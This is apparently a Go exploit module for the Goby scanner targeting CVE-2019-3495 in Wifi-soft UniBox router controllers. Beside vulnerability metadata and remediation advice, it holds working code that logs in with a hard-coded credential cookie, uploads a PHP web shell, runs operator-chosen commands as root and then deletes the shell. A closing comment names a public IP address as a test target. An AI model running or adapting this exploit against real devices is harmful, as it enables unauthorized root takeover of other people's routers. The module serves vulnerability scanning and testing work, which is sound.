package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "fmt"
  "strings"
  "net/url"
)

func init() {
	expJson := `{
    "Name": "UniBox Router RCE(CVE-2019-3495)",
    "Description": "<p>An issue was discovered on Wifi-soft UniBox controller 0.x through 2.x devices. network/mesh/edit-nds.php is vulnerable to arbitrary file upload, allowing an attacker to upload .php files and execute code on the server with root user privileges. Authentication for accessing this component can be bypassed by using Hard coded credentials.</p>",
    "Product": "wifi router",
    "Homepage": "https://www.wifi-soft.com/",
    "DisclosureDate": "2022-08-15",
    "Author": "gonosecto@protonmail.com",
    "FofaQuery": "body=\"UniBox\" && body=\"Controller Model\"",
    "GobyQuery": "body=\"UniBox\" && body=\"Controller Model\"",
    "Level": "3",
    "Impact": "<p>Authentication for accessing this component can be bypassed by using Hard coded credentials.Unauthorized attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.wifi-soft.com/\">https://www.wifi-soft.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://sahildhar.github.io/blogpost/Unibox-Controller-Multiple-Remote-Command-Injection-Vulnerabilties/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND"
    ],
    "ExploitSteps": [
        "AND"
    ],
    "Tags": [
        "File Upload",
        "Permission Bypass"
    ],
    "VulType": [
        "File Upload",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2019-3495"
    ],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "UniBox RCE漏洞(CVE-2019-3495)",
            "Product": "wifi router",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14.4px;\">Wifi-soft UniBox controller 0.x到2.x产品存在致命漏洞。<span style=\"color: rgb(0, 0, 0); font-size: 14.4px;\">network/mesh/edit-nds.php受到文件上传漏洞的影响，该漏洞允许攻击者上传php文件，并可以root权限执行系统命令。同时，使用硬编码可以绕过该设备的登录认证，导致未授权RCE。</span></span><br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><a href=\"https://www.wifi-soft.com/\">https://www.wifi-soft.com/</a></span></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14.4px;\">使用硬编码可以绕过该设备的登录认证,未授权的攻击者<span style=\"font-size: 16px;\">可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个服务器。</span></span><br></p>",
            "VulType": [
                "文件上传",
                "权限绕过"
            ],
            "Tags": [
                "文件上传",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "UniBox Router RCE(CVE-2019-3495)",
            "Product": "wifi router",
            "Description": "<p><span style=\"color: rgb(0, 0, 0); font-size: 14.4px;\">An issue was discovered on Wifi-soft UniBox controller 0.x through 2.x devices. network/mesh/edit-nds.php is vulnerable to arbitrary file upload, allowing an attacker to upload .php files and execute code on the server with root user privileges. Authentication for accessing this component can be bypassed by using Hard coded credentials.</span><br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.wifi-soft.com/\">https://www.wifi-soft.com/</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p><span style=\"font-size: 16px;\"><span style=\"color: rgb(0, 0, 0); font-size: 14.4px;\">Authentication for accessing this component can be bypassed by using Hard coded credentials.Unauthorized a</span>ttackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire server.</span><br></p>",
            "VulType": [
                "File Upload",
                "Permission Bypass"
            ],
            "Tags": [
                "File Upload",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10698"
}`

ExpManager.AddExploit(NewExploit(
  goutils.GetFileName(),
  expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      //httpclient.SetDefaultProxy("http://127.0.0.1:8080")
      cfg := httpclient.NewPostRequestConfig("/network/mesh/edit-nds.php")
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      phpname := goutils.RandomHexString(16)
      cfg.Header.Store("Cookie","user=unibox; pass=294a3d333d2f6b7e121594189fce9a72")
      cfg.Header.Store("Content-Type","multipart/form-data; boundary=cfc5ef72aab9d5ead781940d6e055ff5")
      cfg.Data = fmt.Sprintf("--cfc5ef72aab9d5ead781940d6e055ff5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\n\r\n<?php echo shell_exec(\"sudo /usr/local/unibox-0.9/scripts/exeCommand.sh '\".$_REQUEST['cmd'].\"'\"); ?>\r\n--cfc5ef72aab9d5ead781940d6e055ff5\r\nContent-Disposition: form-data; name=\"sent\"\r\n\r\nSave Page or Upload File\r\n--cfc5ef72aab9d5ead781940d6e055ff5\r\n\r\nContent-Disposition: form-data; name=\"contents\"\r\n\r\n<h1>Welcome to my network</h1>\r\n<a href=\"$authtarget\">Login to my network!</a>\r\n--cfc5ef72aab9d5ead781940d6e055ff5--\r\n",phpname)
      if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/network/mesh/data/uploads/unibox/"+phpname+".php"){
          uri := fmt.Sprintf("/network/mesh/data/uploads/unibox/%s.php?cmd=id;rm+-rf+./%s.php", phpname,phpname)
          cfg := httpclient.NewGetRequestConfig(uri)
          cfg.VerifyTls = false
          cfg.FollowRedirect = false
          if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil{
            return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "uid=0(root) gid=0(root) groups=0(root)")
          }
        }
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)
      encodecmd :=url.QueryEscape(cmd)
      phpname := goutils.RandomHexString(16)
      //httpclient.SetDefaultProxy("http://127.0.0.1:8080")
      cfg := httpclient.NewPostRequestConfig("/network/mesh/edit-nds.php")
      cfg.VerifyTls = false
      cfg.FollowRedirect = false
      cfg.Header.Store("Cookie","user=unibox; pass=294a3d333d2f6b7e121594189fce9a72")
      cfg.Header.Store("Content-Type","multipart/form-data; boundary=cfc5ef72aab9d5ead781940d6e055ff5")
      cfg.Data = fmt.Sprintf("--cfc5ef72aab9d5ead781940d6e055ff5\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\n\r\n<?php echo shell_exec(\"sudo /usr/local/unibox-0.9/scripts/exeCommand.sh '\".$_REQUEST['cmd'].\"'\"); ?>\r\n--cfc5ef72aab9d5ead781940d6e055ff5\r\nContent-Disposition: form-data; name=\"sent\"\r\n\r\nSave Page or Upload File\r\n--cfc5ef72aab9d5ead781940d6e055ff5\r\n\r\nContent-Disposition: form-data; name=\"contents\"\r\n\r\n<h1>Welcome to my network</h1>\r\n<a href=\"$authtarget\">Login to my network!</a>\r\n--cfc5ef72aab9d5ead781940d6e055ff5--\r\n",phpname)
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
        if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "/network/mesh/data/uploads/unibox/"+phpname+".php") {
          uri := fmt.Sprintf("/network/mesh/data/uploads/unibox/%s.php?cmd=%s;rm+-rf+./%s.php", phpname,encodecmd,phpname)
          cfg := httpclient.NewGetRequestConfig(uri)
          cfg.VerifyTls = false
          cfg.FollowRedirect = false
          if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
            if resp.StatusCode == 200{
              expResult.Output = resp.Utf8Html
              expResult.Success = true
            }
          }
        }
      }
      return expResult
    },
  ))
}
//test url:http://110.175.118.88/